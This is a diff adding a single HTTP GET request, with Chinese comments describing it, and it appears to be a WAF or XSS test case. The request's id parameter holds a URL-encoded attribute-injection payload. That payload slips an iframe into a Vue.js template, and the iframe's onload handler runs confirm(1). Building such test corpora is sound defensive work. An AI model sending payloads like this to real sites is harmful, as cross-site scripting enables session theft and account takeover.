@@ -1,0 +1,10 @@
+# XSS跨站脚本_GET_常规_框架_VueJS-06506734
+# 通过这种属性注入的方式，将包含一个 <iframe> 元素插入到模板中。
+# <iframe> 是 HTML 中用于嵌入其他文档或资源的标签。在给定的代码中，onload 事件被触发时，将执行 confirm(1) 函数
+GET /?id=%3Cx%20title%22=%22&lt%3Biframe&Tab%3Bonload&Tab%3B=confirm%281%29&gt%3B%22%3E&bid=hd_tag_m8mv25f9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25f9
+RM-PRO-Token: 136c06b1ca399a3a766d9cfb3e1e7748
+RM-PRO-Time: 1742808464743
+User-Agent: curl/7.83.1
+
